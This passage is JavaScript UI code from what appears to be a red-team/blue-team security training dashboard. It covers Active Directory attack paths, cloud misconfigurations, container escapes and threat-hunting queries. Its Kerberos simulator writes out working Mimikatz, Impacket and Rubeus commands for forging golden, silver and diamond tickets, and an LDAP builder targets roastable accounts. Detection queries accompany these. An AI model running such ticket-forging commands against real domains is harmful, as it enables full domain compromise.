              '<table class="ag-tbl"><thead><tr><th>SAMAccountName</th><th>DN</th><th>Groups</th><th>SPN</th><th>AS-REP</th><th>Notes</th></tr></thead><tbody>' +
              AD_SIM_USERS.map(function(u) {
                var isDAdmin = u.groups.indexOf('Domain Admins') >= 0;
                return '<tr style="' + (isDAdmin ? 'background:rgba(255,23,68,.05)' : u.spn ? 'background:rgba(255,145,0,.05)' : u.asrep ? 'background:rgba(255,214,0,.05)' : '') + '">' +
                  '<td style="color:var(--acc);font-weight:600">' + esc(u.sam) + '</td>' +
                  '<td style="font-size:.6rem;color:var(--mut)">' + esc(u.dn) + '</td>' +
                  '<td style="font-size:.6rem">' + u.groups.map(function(g) { return '<span class="ag-badge ' + (g === 'Domain Admins' || g === 'Enterprise Admins' ? 'ag-crit' : g.indexOf('Operators') >= 0 ? 'ag-high' : 'ag-info') + '" style="font-size:.5rem;margin:1px">' + esc(g) + '</span>'; }).join(' ') + '</td>' +
                  '<td>' + (u.spn ? '<span class="ag-badge ag-high" style="font-size:.5rem">YES</span>' : '-') + '</td>' +
                  '<td>' + (u.asrep ? '<span class="ag-badge ag-crit" style="font-size:.5rem">VULN</span>' : '-') + '</td>' +
                  '<td style="font-size:.6rem;color:var(--mut)">' + esc(u.desc) + '</td>' +
                '</tr>';
              }).join('') +
              '</tbody></table>' +
            '</div>' +
          '</div>';
      } else if (tab === 'paths') {
        ac.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">ATTACK PATH VISUALIZATION</span><span style="flex:1"></span><span style="color:var(--mut)">BloodHound-style analysis</span></div>' +
            '<div class="ag-panel-b">' +
              AD_ATTACK_PATHS.map(function(path) {
                var sCls = path.severity === 'Critical' ? 'ag-crit' : 'ag-high';
                return '<div class="ag-panel" style="margin-bottom:10px;border-left:3px solid ' + (path.severity === 'Critical' ? '#ff1744' : '#ff9100') + '">' +
                  '<div class="ag-panel-h">' +
                    '<span class="ag-badge ' + sCls + '">' + esc(path.severity) + '</span>' +
                    '<span style="font-weight:700;color:var(--txt)">' + esc(path.name) + '</span>' +
                    '<span style="flex:1"></span>' +
                    '<span style="color:var(--acc);font-size:.62rem">' + esc(path.technique) + '</span>' +
                    '<span class="ag-badge ' + (path.likelihood === 'High' ? 'ag-high' : 'ag-med') + '" style="font-size:.5rem">LIKELIHOOD: ' + esc(path.likelihood) + '</span>' +
                  '</div>' +
                  '<div class="ag-panel-b">' +
                    '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;font-size:.68rem">' +
                      '<span style="color:var(--mut)">From:</span><span style="color:#ff9100;font-weight:600">' + esc(path.from) + '</span>' +
                      '<span style="color:var(--mut)">-></span>' +
                      '<span style="color:#ff1744;font-weight:600">' + esc(path.to) + '</span>' +
                    '</div>' +
                    path.steps.map(function(step, i) {
                      return '<div class="ag-chain-step ' + (i === path.steps.length - 1 ? 'crit' : 'high') + '">' +
                        '<span style="color:var(--acc);font-weight:700;min-width:20px">' + (i+1) + '.</span>' +
                        '<span style="color:var(--txt);font-size:.68rem">' + esc(step) + '</span>' +
                      '</div>';
                    }).join('') +
                  '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>';
      } else if (tab === 'attacks') {
        ac.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">ACTIVE DIRECTORY ATTACK LIBRARY</span><span style="flex:1"></span><span style="color:var(--mut)">' + AD_ATTACKS_DB.length + ' techniques</span></div>' +
            '<div class="ag-panel-b">' +
              AD_ATTACKS_DB.map(function(a) {
                return '<details style="border-bottom:1px solid var(--line);padding:10px 0">' +
                  '<summary style="cursor:pointer;display:flex;align-items:center;gap:8px">' +
                    '<span style="font-weight:700;font-size:.78rem;color:var(--txt)">' + esc(a.name) + '</span>' +
                    '<span style="color:var(--acc);font-size:.62rem">' + esc(a.mitre) + '</span>' +
                  '</summary>' +
                  '<div style="margin-top:8px;font-size:.7rem">' +
                    '<div style="color:var(--mut);margin-bottom:6px">' + esc(a.desc) + '</div>' +
                    '<div style="margin-bottom:4px"><span style="color:var(--acc);font-weight:600;font-size:.62rem">PREREQUISITE:</span></div>' +
                    '<div style="color:#ff9100;font-size:.65rem;margin-bottom:6px">' + esc(a.prereq) + '</div>' +
                    '<div style="margin-bottom:4px"><span style="color:var(--acc);font-weight:600;font-size:.62rem">TOOL/COMMAND:</span></div>' +
                    '<pre style="background:rgba(0,0,0,.3);padding:8px;border-radius:3px;font-size:.62rem;color:#00e676;overflow-x:auto;white-space:pre-wrap;margin:0 0 6px">' + esc(a.tool) + '</pre>' +
                    '<div style="margin-bottom:4px"><span style="color:var(--acc);font-weight:600;font-size:.62rem">DETECTION:</span></div>' +
                    '<div style="color:var(--mut);font-size:.65rem">' + esc(a.detection) + '</div>' +
                  '</div>' +
                '</details>';
              }).join('') +
            '</div>' +
          '</div>';
      } else if (tab === 'kerberos') {
        ac.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">KERBEROS TICKET FORGING SIMULATOR</span></div>' +
            '<div class="ag-panel-b">' +
              '<div class="ag-grid2" style="gap:8px;margin-bottom:10px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Ticket Type</label>' +
                  '<select class="ag-sel" id="ag-krbtype" style="width:100%"><option>Golden Ticket (TGT)</option><option>Silver Ticket (TGS)</option><option>Diamond Ticket</option></select></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Domain</label><input class="ag-inp" id="ag-krbdom" value="CORP.LOCAL"></div>' +
              '</div>' +
              '<div class="ag-grid2" style="gap:8px;margin-bottom:10px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Domain SID</label><input class="ag-inp" id="ag-krbsid" value="S-1-5-21-1234567890-9876543210-1122334455"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">krbtgt/Service Hash (NTLM)</label><input class="ag-inp" id="ag-krbhash" placeholder="e.g. a4f49c406510bdcab6824ee7c30fd852"></div>' +
              '</div>' +
              '<div class="ag-grid3" style="gap:8px;margin-bottom:10px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Impersonate User</label><input class="ag-inp" id="ag-krbuser" value="Administrator"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">User ID</label><input class="ag-inp" id="ag-krbuid" value="500"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Ticket Lifetime (hours)</label><input class="ag-inp" id="ag-krblife" value="87600" type="number"></div>' +
              '</div>' +
              '<button class="ag-btn" id="ag-krbforge">GENERATE FORGE COMMAND</button>' +
              '<div id="ag-krbout" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>';

        ac.querySelector('#ag-krbforge').onclick = function() {
          var type = ac.querySelector('#ag-krbtype').value;
          var domain = ac.querySelector('#ag-krbdom').value;
          var sid = ac.querySelector('#ag-krbsid').value;
          var hash = ac.querySelector('#ag-krbhash').value || 'HASH_HERE';
          var user = ac.querySelector('#ag-krbuser').value;
          var uid = ac.querySelector('#ag-krbuid').value;
          var lifetime = ac.querySelector('#ag-krblife').value;
          var cmd = '';
          if (type.indexOf('Golden') >= 0) {
            cmd = '# Golden Ticket - Forge TGT with krbtgt hash\n';
            cmd += '# This provides unrestricted domain access\n\n';
            cmd += '# Mimikatz:\n';
            cmd += 'mimikatz # kerberos::golden /domain:' + domain + ' /sid:' + sid + ' /krbtgt:' + hash + ' /user:' + user + ' /id:' + uid + ' /ptt\n\n';
            cmd += '# Impacket:\n';
            cmd += 'python ticketer.py -nthash ' + hash + ' -domain-sid ' + sid + ' -domain ' + domain + ' ' + user + '\n';
            cmd += 'export KRB5CCNAME=' + user + '.ccache\n';
            cmd += 'python psexec.py -k -no-pass ' + domain + '/Administrator@dc01.' + domain.toLowerCase();
          } else if (type.indexOf('Silver') >= 0) {
            cmd = '# Silver Ticket - Forge TGS for specific service\n';
            cmd += '# More stealthy than Golden Ticket (no DC contact)\n\n';
            cmd += '# Mimikatz:\n';
            cmd += 'mimikatz # kerberos::golden /domain:' + domain + ' /sid:' + sid + ' /target:server.' + domain.toLowerCase() + ' /service:cifs /rc4:' + hash + ' /user:' + user + ' /ptt\n\n';
            cmd += '# Impacket:\n';
            cmd += 'python ticketer.py -nthash ' + hash + ' -domain-sid ' + sid + ' -domain ' + domain + ' -spn cifs/server.' + domain.toLowerCase() + ' ' + user;
          } else {
            cmd = '# Diamond Ticket - Modify legitimate TGT\n';
            cmd += '# Hardest to detect - uses legitimate ticket as base\n\n';
            cmd += '# Rubeus:\n';
            cmd += 'Rubeus.exe diamond /krbkey:' + hash + ' /user:' + user + ' /password:PASSWORD /enctype:aes256 /domain:' + domain + ' /dc:dc01.' + domain.toLowerCase() + ' /ticketuser:' + user + ' /ticketuserid:' + uid + ' /groups:512 /ptt';
          }
          ac.querySelector('#ag-krbout').innerHTML =
            '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">FORGE COMMAND</span></div><div class="ag-panel-b">' +
            '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.65rem;color:var(--acc);overflow-x:auto;white-space:pre-wrap">' + esc(cmd) + '</pre></div></div>';
        };
      } else if (tab === 'ldap') {
        ac.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">LDAP QUERY BUILDER</span></div>' +
            '<div class="ag-panel-b">' +
              '<div style="margin-bottom:8px"><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Base DN</label><input class="ag-inp" id="ag-ldapbase" value="DC=corp,DC=local"></div>' +
              '<div style="margin-bottom:8px"><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Query Template</label>' +
                '<select class="ag-sel" id="ag-ldaptempl" style="width:100%">' +
                  '<option value="(&(objectClass=user)(objectCategory=person))">All Users</option>' +
                  '<option value="(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))">Domain Admins</option>' +
                  '<option value="(&(objectClass=user)(servicePrincipalName=*))">Users with SPNs (Kerberoastable)</option>' +
                  '<option value="(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))">AS-REP Roastable Users</option>' +
                  '<option value="(&(objectClass=computer)(operatingSystem=*server*))">Domain Controllers</option>' +
                  '<option value="(&(objectClass=groupPolicyContainer))">Group Policy Objects</option>' +
                  '<option value="(&(objectClass=trustedDomain))">Domain Trusts</option>' +
                  '<option value="(&(objectClass=user)(adminCount=1))">AdminCount=1 Users</option>' +
                  '<option value="(&(objectClass=user)(msDS-AllowedToDelegateTo=*))">Constrained Delegation</option>' +
                  '<option value="(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))">RBCD Configured</option>' +
                '</select></div>' +
              '<div style="margin-bottom:8px"><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Custom Filter</label><input class="ag-inp" id="ag-ldapcustom" placeholder="(&(objectClass=user)(cn=*admin*))"></div>' +
              '<button class="ag-btn" id="ag-ldaprun">BUILD QUERY</button>' +
              '<div id="ag-ldapout" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>';

        ac.querySelector('#ag-ldaprun').onclick = function() {
          var base = ac.querySelector('#ag-ldapbase').value;
          var template = ac.querySelector('#ag-ldaptempl').value;
          var custom = ac.querySelector('#ag-ldapcustom').value.trim();
          var filter = custom || template;
          var cmd = '';
          cmd += '# LDAP Query: ' + filter + '\n\n';
          cmd += '# ldapsearch:\n';
          cmd += 'ldapsearch -x -H ldap://dc01.corp.local -b "' + base + '" "' + filter + '"\n\n';
          cmd += '# PowerShell (ADSI):\n';
          cmd += '$searcher = [adsisearcher]"' + filter + '"\n';
          cmd += '$searcher.SearchRoot = [adsi]"LDAP://' + base + '"\n';
          cmd += '$searcher.FindAll() | ForEach-Object { $_.Properties }\n\n';
          cmd += '# Python (ldap3):\n';
          cmd += 'from ldap3 import Server, Connection, ALL\n';
          cmd += 'server = Server("dc01.corp.local", get_info=ALL)\n';
          cmd += 'conn = Connection(server, user="corp\\\\user", password="pass")\n';
          cmd += 'conn.bind()\n';
          cmd += 'conn.search("' + base + '", "' + filter + '", attributes=["*"])';

          ac.querySelector('#ag-ldapout').innerHTML =
            '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">LDAP COMMANDS</span></div><div class="ag-panel-b">' +
            '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.65rem;color:var(--acc);overflow-x:auto;white-space:pre-wrap">' + esc(cmd) + '</pre></div></div>';
        };
      }
    }
    renderADContent(adTab);
    c.querySelectorAll('[data-ad]').forEach(function(b) {
      b.onclick = function() {
        adTab = b.dataset.ad;
        c.querySelectorAll('[data-ad]').forEach(function(x) { x.classList.toggle('ag-btn-ghost', x.dataset.ad !== adTab); });
        renderADContent(adTab);
      };
    });
  }

  // ========== CLOUD ATTACK SURFACE ==========
  function renderCloudAttack(c) {
    var cloudTab = 'inventory';
    c.innerHTML =
      '<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">' +
        ['inventory:Asset Inventory','misconfig:Misconfigurations','iam:IAM Analyzer','privesc:Privilege Escalation','containers:Container Escape'].map(function(t) {
          var p = t.split(':');
          return '<button class="ag-btn' + (cloudTab === p[0] ? '' : ' ag-btn-ghost') + '" data-ct="' + p[0] + '">' + p[1] + '</button>';
        }).join('') +
      '</div>' +
      '<div id="ag-cloudcontent"></div>';

    function renderCloudContent(tab) {
      var cc = c.querySelector('#ag-cloudcontent');
      if (tab === 'inventory') {
        var allAssets = [];
        ['aws','azure','gcp'].forEach(function(provider) {
          (CLOUD_ASSETS[provider] || []).forEach(function(a) {
            allAssets.push({ provider: provider.toUpperCase(), type: a.type, name: a.name, region: a.region, status: a.status, public: a.public, risk: a.risk, issue: a.issue });
          });
        });
        var critCount = allAssets.filter(function(a){return a.risk==='Critical'}).length;
        var highCount = allAssets.filter(function(a){return a.risk==='High'}).length;
        var publicCount = allAssets.filter(function(a){return a.public}).length;

        cc.innerHTML =
          '<div class="ag-grid4" style="margin-bottom:10px">' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc)">' + allAssets.length + '</div><div class="ag-stat-l">Total Assets</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff1744">' + critCount + '</div><div class="ag-stat-l">Critical Risk</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff9100">' + highCount + '</div><div class="ag-stat-l">High Risk</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ffd600">' + publicCount + '</div><div class="ag-stat-l">Public Facing</div></div>' +
          '</div>' +
          ['aws','azure','gcp'].map(function(provider) {
            var assets = CLOUD_ASSETS[provider] || [];
            var providerColors = { aws: '#ff9100', azure: '#2196f3', gcp: '#00e676' };
            var providerNames = { aws: 'AMAZON WEB SERVICES', azure: 'MICROSOFT AZURE', gcp: 'GOOGLE CLOUD PLATFORM' };
            return '<div class="ag-panel" style="margin-bottom:10px">' +
              '<div class="ag-panel-h"><span style="color:' + providerColors[provider] + '">' + providerNames[provider] + '</span><span style="flex:1"></span><span style="color:var(--mut)">' + assets.length + ' resources</span></div>' +
              '<div class="ag-panel-b">' +
                '<table class="ag-tbl"><thead><tr><th>Type</th><th>Name</th><th>Region</th><th>Public</th><th>Risk</th><th>Issue</th></tr></thead><tbody>' +
                assets.map(function(a) {
                  var rCls = a.risk === 'Critical' ? 'ag-crit' : a.risk === 'High' ? 'ag-high' : a.risk === 'Medium' ? 'ag-med' : 'ag-low';
                  return '<tr>' +
                    '<td style="color:' + providerColors[provider] + ';font-size:.65rem;font-weight:600">' + esc(a.type) + '</td>' +
                    '<td style="font-weight:600;font-size:.68rem">' + esc(a.name) + '</td>' +
                    '<td style="color:var(--mut);font-size:.62rem">' + esc(a.region) + '</td>' +
                    '<td>' + (a.public ? '<span class="ag-badge ag-high" style="font-size:.5rem">PUBLIC</span>' : '<span style="color:var(--mut);font-size:.62rem">Private</span>') + '</td>' +
                    '<td><span class="ag-badge ' + rCls + '">' + esc(a.risk) + '</span></td>' +
                    '<td style="font-size:.62rem;color:var(--mut)">' + esc(a.issue) + '</td>' +
                  '</tr>';
                }).join('') +
                '</tbody></table>' +
              '</div>' +
            '</div>';
          }).join('');
      } else if (tab === 'misconfig') {
        var misconfigs = [];
        ['aws','azure','gcp'].forEach(function(provider) {
          (CLOUD_ASSETS[provider] || []).forEach(function(a) {
            if (a.risk === 'Critical' || a.risk === 'High') {
              misconfigs.push({ provider: provider.toUpperCase(), type: a.type, name: a.name, risk: a.risk, issue: a.issue });
            }
          });
        });
        cc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:#ff1744">MISCONFIGURATION SCANNER</span><span style="flex:1"></span><span style="color:var(--mut)">' + misconfigs.length + ' findings</span></div>' +
            '<div class="ag-panel-b">' +
              misconfigs.sort(function(a,b) { return a.risk === 'Critical' ? -1 : b.risk === 'Critical' ? 1 : 0; }).map(function(m) {
                var rCls = m.risk === 'Critical' ? 'ag-crit' : 'ag-high';
                return '<div style="border-bottom:1px solid var(--line);padding:8px 0;display:flex;align-items:flex-start;gap:8px">' +
                  '<span class="ag-badge ' + rCls + '">' + esc(m.risk) + '</span>' +
                  '<div>' +
                    '<div style="font-size:.72rem;font-weight:600">' + esc(m.provider) + ' / ' + esc(m.type) + ' / ' + esc(m.name) + '</div>' +
                    '<div style="font-size:.68rem;color:var(--mut);margin-top:2px">' + esc(m.issue) + '</div>' +
                  '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>';
      } else if (tab === 'iam') {
        var iamIssues = [];
        ['aws','azure','gcp'].forEach(function(provider) {
          (CLOUD_ASSETS[provider] || []).forEach(function(a) {
            if (a.type === 'IAM' || a.type === 'Lambda' || a.issue.toLowerCase().indexOf('iam') >= 0 || a.issue.toLowerCase().indexOf('admin') >= 0 || a.issue.toLowerCase().indexOf('role') >= 0 || a.issue.toLowerCase().indexOf('service account') >= 0) {
              iamIssues.push({ provider: provider.toUpperCase(), type: a.type, name: a.name, risk: a.risk, issue: a.issue });
            }
          });
        });
        cc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">IAM POLICY ANALYZER</span><span style="flex:1"></span><span style="color:var(--mut)">' + iamIssues.length + ' issues</span></div>' +
            '<div class="ag-panel-b">' +
              '<p style="font-size:.7rem;color:var(--mut);margin:0 0 10px">Identifies overly permissive IAM policies, long-lived credentials, and privilege escalation risks across cloud providers.</p>' +
              '<table class="ag-tbl"><thead><tr><th>Provider</th><th>Resource</th><th>Name</th><th>Risk</th><th>Finding</th></tr></thead><tbody>' +
              iamIssues.map(function(i) {
                var rCls = i.risk === 'Critical' ? 'ag-crit' : i.risk === 'High' ? 'ag-high' : 'ag-med';
                return '<tr><td style="font-weight:600;font-size:.65rem">' + esc(i.provider) + '</td><td style="color:var(--acc);font-size:.65rem">' + esc(i.type) + '</td><td style="font-size:.68rem">' + esc(i.name) + '</td><td><span class="ag-badge ' + rCls + '">' + esc(i.risk) + '</span></td><td style="font-size:.62rem;color:var(--mut)">' + esc(i.issue) + '</td></tr>';
              }).join('') +
              '</tbody></table>' +
            '</div>' +
          '</div>';
      } else if (tab === 'privesc') {
        cc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">CLOUD PRIVILEGE ESCALATION PATHS</span><span style="flex:1"></span><span style="color:var(--mut)">' + CLOUD_PRIVESC_PATHS.length + ' paths</span></div>' +
            '<div class="ag-panel-b">' +
              CLOUD_PRIVESC_PATHS.map(function(path) {
                var cloudColor = path.cloud === 'AWS' ? '#ff9100' : path.cloud === 'Azure' ? '#2196f3' : '#00e676';
                var rCls = path.risk === 'Critical' ? 'ag-crit' : 'ag-high';
                return '<div class="ag-panel" style="margin-bottom:8px;border-left:3px solid ' + cloudColor + '">' +
                  '<div class="ag-panel-h">' +
                    '<span class="ag-badge" style="background:' + cloudColor + '22;color:' + cloudColor + ';border:1px solid ' + cloudColor + '44">' + esc(path.cloud) + '</span>' +
                    '<span style="font-weight:700;color:var(--txt)">' + esc(path.name) + '</span>' +
                    '<span style="flex:1"></span>' +
                    '<span class="ag-badge ' + rCls + '">' + esc(path.risk) + '</span>' +
                  '</div>' +
                  '<div class="ag-panel-b">' +
                    path.steps.map(function(step, i) {
                      return '<div class="ag-chain-step ' + (i === path.steps.length-1 ? 'crit' : 'high') + '">' +
                        '<span style="color:var(--acc);font-weight:700;min-width:20px">' + (i+1) + '.</span>' +
                        '<span style="color:var(--txt);font-size:.68rem">' + esc(step) + '</span>' +
                      '</div>';
                    }).join('') +
                  '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>';
      } else if (tab === 'containers') {
        cc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:#ff1744">CONTAINER ESCAPE SCENARIOS</span><span style="flex:1"></span><span style="color:var(--mut)">' + CONTAINER_ESCAPES.length + ' techniques</span></div>' +
            '<div class="ag-panel-b">' +
              CONTAINER_ESCAPES.map(function(e) {
                var rCls = e.risk === 'Critical' ? 'ag-crit' : 'ag-high';
                return '<details style="border-bottom:1px solid var(--line);padding:10px 0">' +
                  '<summary style="cursor:pointer;display:flex;align-items:center;gap:8px">' +
                    '<span class="ag-badge ' + rCls + '">' + esc(e.risk) + '</span>' +
                    '<span style="font-weight:700;font-size:.75rem">' + esc(e.name) + '</span>' +
                  '</summary>' +
                  '<div style="margin-top:8px">' +
                    '<div style="color:var(--mut);font-size:.7rem;margin-bottom:6px">' + esc(e.desc) + '</div>' +
                    '<div style="font-size:.62rem;color:var(--acc);font-weight:600;margin-bottom:4px">EXPLOIT:</div>' +
                    '<pre style="background:rgba(0,0,0,.3);padding:8px;border-radius:3px;font-size:.62rem;color:#ff1744;overflow-x:auto;white-space:pre-wrap;margin:0 0 6px">' + esc(e.exploit) + '</pre>' +
                    '<div style="font-size:.62rem;color:var(--acc);font-weight:600;margin-bottom:4px">DETECTION / MITIGATION:</div>' +
                    '<div style="font-size:.68rem;color:var(--mut)">' + esc(e.detection) + '</div>' +
                  '</div>' +
                '</details>';
              }).join('') +
            '</div>' +
          '</div>';
      }
    }
    renderCloudContent(cloudTab);
    c.querySelectorAll('[data-ct]').forEach(function(b) {
      b.onclick = function() {
        cloudTab = b.dataset.ct;
        c.querySelectorAll('[data-ct]').forEach(function(x) { x.classList.toggle('ag-btn-ghost', x.dataset.ct !== cloudTab); });
        renderCloudContent(cloudTab);
      };
    });
  }

  // ========== THREAT HUNTING WORKBENCH ==========
  function renderThreatHunting(c, mission) {
    var huntTab = 'hypotheses';
    c.innerHTML =
      '<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">' +
        ['hypotheses:Hunt Hypotheses','queries:Query Builder','playbooks:Hunt Playbooks','evidence:Evidence Timeline'].map(function(t) {
          var p = t.split(':');
          return '<button class="ag-btn' + (huntTab === p[0] ? '' : ' ag-btn-ghost') + '" data-ht="' + p[0] + '">' + p[1] + '</button>';
        }).join('') +
      '</div>' +
      '<div id="ag-huntcontent"></div>';

    function renderHuntContent(tab) {
      var hc = c.querySelector('#ag-huntcontent');
      if (tab === 'hypotheses') {
        hc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">HUNT HYPOTHESES</span><span style="flex:1"></span><span style="color:var(--mut)">' + HUNT_HYPOTHESES.length + ' active hunts</span></div>' +
            '<div class="ag-panel-b">' +
              HUNT_HYPOTHESES.map(function(h) {
                return '<details style="border-bottom:1px solid var(--line);padding:10px 0">' +
                  '<summary style="cursor:pointer;display:flex;align-items:center;gap:8px">' +
                    '<span class="ag-badge ag-info" style="font-size:.5rem">' + esc(h.id) + '</span>' +
                    '<span style="font-weight:700;font-size:.75rem;color:var(--txt)">' + esc(h.name) + '</span>' +
                    '<span style="flex:1"></span>' +
                    '<span class="ag-badge ag-low">' + esc(h.status) + '</span>' +
                    h.mitre.map(function(m) { return '<span style="color:var(--acc);font-size:.55rem">' + esc(m) + '</span>'; }).join(' ') +
                  '</summary>' +
                  '<div style="margin-top:10px;font-size:.7rem">' +
                    '<div style="color:var(--mut);margin-bottom:8px;font-style:italic">"' + esc(h.hypothesis) + '"</div>' +
                    '<div style="margin-bottom:6px"><span style="color:var(--acc);font-weight:600;font-size:.62rem">DATA SOURCES:</span></div>' +
                    '<div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px">' +
                      h.datasources.map(function(d) { return '<span class="ag-badge ag-med" style="font-size:.5rem">' + esc(d) + '</span>'; }).join('') +
                    '</div>' +
                    '<div style="margin-bottom:6px"><span style="color:var(--acc);font-weight:600;font-size:.62rem">DETECTION QUERIES:</span></div>' +
                    h.queries.map(function(q) {
                      return '<pre style="background:rgba(0,0,0,.3);padding:6px;border-radius:3px;font-size:.6rem;color:#00e5ff;overflow-x:auto;white-space:pre-wrap;margin:0 0 4px">' + esc(q) + '</pre>';
                    }).join('') +
                    '<div style="margin-top:8px;margin-bottom:6px"><span style="color:var(--acc);font-weight:600;font-size:.62rem">INDICATORS TO LOOK FOR:</span></div>' +
                    '<ul style="margin:0;padding-left:16px;color:var(--mut)">' +
                      h.indicators.map(function(ind) { return '<li style="font-size:.65rem;margin-bottom:2px">' + esc(ind) + '</li>'; }).join('') +
                    '</ul>' +
                  '</div>' +
                '</details>';
              }).join('') +
            '</div>' +
          '</div>';
      } else if (tab === 'queries') {
        hc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">DETECTION QUERY BUILDER</span></div>' +
            '<div class="ag-panel-b">' +
              '<div class="ag-grid3" style="margin-bottom:10px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Query Language</label>' +
                  '<select class="ag-sel" id="ag-huntlang" style="width:100%"><option>Splunk SPL</option><option>Elastic KQL</option><option>Sigma</option><option>Microsoft KQL</option></select></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Data Source</label>' +
                  '<select class="ag-sel" id="ag-huntds" style="width:100%"><option>Windows Security</option><option>Sysmon</option><option>PowerShell</option><option>DNS</option><option>Proxy</option><option>Network Flow</option><option>EDR</option><option>Cloud Trail</option></select></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Detection Category</label>' +
                  '<select class="ag-sel" id="ag-huntcat" style="width:100%"><option>Credential Access</option><option>Lateral Movement</option><option>Execution</option><option>Persistence</option><option>Exfiltration</option><option>Defense Evasion</option><option>C2 Communication</option></select></div>' +
              '</div>' +
              '<div style="margin-bottom:8px"><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Custom Parameters</label><input class="ag-inp" id="ag-huntparam" placeholder="e.g. timerange=24h, threshold=5, source_ip=10.0.0.0/8"></div>' +
              '<button class="ag-btn" id="ag-huntbuild">BUILD QUERY</button>' +
              '<div id="ag-huntqout" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>';

        hc.querySelector('#ag-huntbuild').onclick = function() {
          var lang = hc.querySelector('#ag-huntlang').value;
          var ds = hc.querySelector('#ag-huntds').value;
          var cat = hc.querySelector('#ag-huntcat').value;
          var query = '';
          if (lang === 'Splunk SPL') {
            if (cat === 'Credential Access') query = 'index=security sourcetype=WinEventLog:Security\n| search (EventCode=4769 AND Ticket_Encryption_Type=0x17 AND Service_Name!="krbtgt")\n  OR (EventCode=4768 AND Pre_Authentication_Type=0)\n  OR (EventCode=4662 AND Properties="*Replicating Directory Changes*")\n| eval attack_type=case(\n    EventCode=4769, "Kerberoasting",\n    EventCode=4768, "AS-REP Roasting",\n    EventCode=4662, "DCSync"\n  )\n| stats count by attack_type, Account_Name, src_ip\n| where count > 3\n| sort -count';
            else if (cat === 'Lateral Movement') query = 'index=security sourcetype=WinEventLog:Security EventCode=4624\n| search (Logon_Type=3 OR Logon_Type=9 OR Logon_Type=10)\n| stats count dc(dest) as unique_hosts by Account_Name, src_ip, Logon_Type\n| where unique_hosts > 3\n| sort -unique_hosts';
            else if (cat === 'Execution') query = 'index=sysmon EventCode=1\n| search (ParentImage="*\\\\winword.exe" OR ParentImage="*\\\\excel.exe" OR ParentImage="*\\\\outlook.exe")\n  AND (Image="*\\\\cmd.exe" OR Image="*\\\\powershell.exe" OR Image="*\\\\wscript.exe" OR Image="*\\\\mshta.exe")\n| table _time, ComputerName, User, ParentImage, Image, CommandLine';
            else query = 'index=* sourcetype=*\n| search EventCode=*\n| stats count by source, EventCode\n| sort -count\n| head 20';
          } else if (lang === 'Elastic KQL') {
            if (cat === 'Credential Access') query = 'event.code: ("4769" OR "4768" OR "4662")\nAND NOT user.name: "krbtgt"\nAND winlog.event_data.TicketEncryptionType: "0x17"';
            else query = 'event.code: * | stats count by event.code, source.ip';
          } else if (lang === 'Sigma') {
            query = 'title: Custom ' + cat + ' Detection\nstatus: experimental\nlevel: high\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID:\n      - 4624\n      - 4625\n  condition: selection\nfalsepositives:\n  - Legitimate admin activity\ntags:\n  - attack.' + cat.toLowerCase().replace(/ /g, '_');
          } else {
            query = '// Microsoft KQL (Sentinel)\nSecurityEvent\n| where EventID in (4624, 4625, 4648)\n| where TimeGenerated > ago(24h)\n| summarize count() by Account, Computer, EventID\n| where count_ > 5\n| sort by count_ desc';
          }
          hc.querySelector('#ag-huntqout').innerHTML =
